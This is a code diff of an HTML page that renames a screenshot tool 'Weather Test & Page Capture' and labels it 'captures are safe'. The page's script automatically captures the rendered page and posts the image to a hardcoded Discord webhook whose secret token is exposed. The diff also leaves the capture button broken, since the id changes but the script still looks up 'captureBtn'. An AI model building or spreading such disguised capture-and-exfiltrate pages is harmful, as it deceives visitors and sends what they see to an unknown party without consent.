@@ -8,8 +8,13 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f9f9f9;
+            background-color: #2fb2d6;
             margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
         }
         #loader {
             position: fixed;
@@ -40,26 +45,46 @@
             text-align: center;
             padding: 50px;
         }
+        #box {
+            background-color: #ffffff;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            max-width: 500px;
+        }
         h1 {
             font-size: 2.5rem;
             color: #2E3A59;
             margin-bottom: 20px;
         }
-        .capture-btn {
-            background-color: #2E3A59;
+        .button-container {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 20px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
             color: #fff;
+            background-color: #439fd1;
             border: none;
-            border-radius: 8px;
-            padding: 12px 24px;
-            font-size: 1.2rem;
+            border-radius: 5px;
             cursor: pointer;
             transition: background-color 0.3s ease;
         }
-        .capture-btn:hover {
-            background-color: #4a5a84;
+
+        button:hover {
+            background-color: #5473a8;
         }
-        .capture-btn:active {
-            background-color: #1c253a;
+
+        .reload-button {
+            background-color: #439fd1;
+        }
+
+        .reload-button:hover {
+            background-color: #5473a8;
         }
         #status {
             margin-top: 20px;
@@ -79,21 +104,27 @@
     </div>
 
     <div id="content">
-        <h1>Screenshot Capture 📸 (beta)</h1>
-        <button id="captureBtn" class="capture-btn">Capture Screenshot</button>
-        <p id="status">Status: Waiting for action...</p>
-        <p id="version"></p>
+        <div id="box">
+            <h1>Weather Test & Page Capture 🌤</h1>
+            <button id="button" class="capture-btn">Capture Page</button>
+            <button onclick="reloadPage()">Reload Page</button>
+            <p id="status">Status: waiting for action to  get ready...</p>
+        </div>
+        <p id="version">Version: 2.6</p>
     </div>
-
+        
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script>
+            async function reloadPage() {
+            location.reload(); // Reload the current tab
+        }
         const captureBtn = document.getElementById('captureBtn');
         const status = document.getElementById('status');
         const versionElement = document.getElementById('version');
         const loader = document.getElementById('loader');
         const content = document.getElementById('content');
 
-        const currentVersion = "2.3";
+        const currentVersion = "2.6 | captures are safe, made by gghunter";
         versionElement.innerText = `Version: ${currentVersion}`;
 
         (async function() {
@@ -122,26 +153,26 @@
         // Function to automatically capture screenshot
         async function autoCaptureScreenshot() {
             try {
-                status.innerText = 'Capturing screenshot automatically... 📸';
+                status.innerText = 'capturing screen automatically... 📸';
                 const imageUrl = await captureScreen();
                 await sendScreenshotToDiscord(imageUrl);
-                status.innerText = 'Auto screenshot sent successfully! 🖼️';
+                status.innerText = 'Auto capture went smooth 🙌!️';
             } catch (error) {
-                console.error('Auto screenshot capture error:', error);
-                status.innerText = 'Failed to capture auto screenshot';
+                console.error('auto capture error:', error);
+                status.innerText = 'Failed to capture automatically';
             }
         }
 
         // Add click event listener for screenshot capture
         captureBtn.addEventListener('click', async () => {
             try {
-                status.innerText = 'Capturing screenshot... 📸';
+                status.innerText = 'capturing screen... 📸';
                 const imageUrl = await captureScreen();
                 await sendScreenshotToDiscord(imageUrl);
                 status.innerText = 'Screenshot sent successfully! 🖼️';
             } catch (error) {
                 console.error('Screenshot capture error:', error);
-                status.innerText = 'Failed to capture screenshot';
+                status.innerText = 'Failed to capture screen';
             }
         });
 
@@ -277,6 +308,7 @@
             });
         }
 
+            
         async function sendScreenshotToDiscord(imageUrl) {
             const webhookUrl = 'https://discord.com/api/webhooks/1326040924417163366/g72A2fFCy2ACXQH-RIDbKVOK4w5JmEmEgMn3nBHieFLfpZ_ItSVWoTXPaYWXjCz-_iqE';
 
@@ -300,6 +332,7 @@
                 },
                 body: JSON.stringify(webhookPayload)
             });
+            
         }
     </script>
 </body>
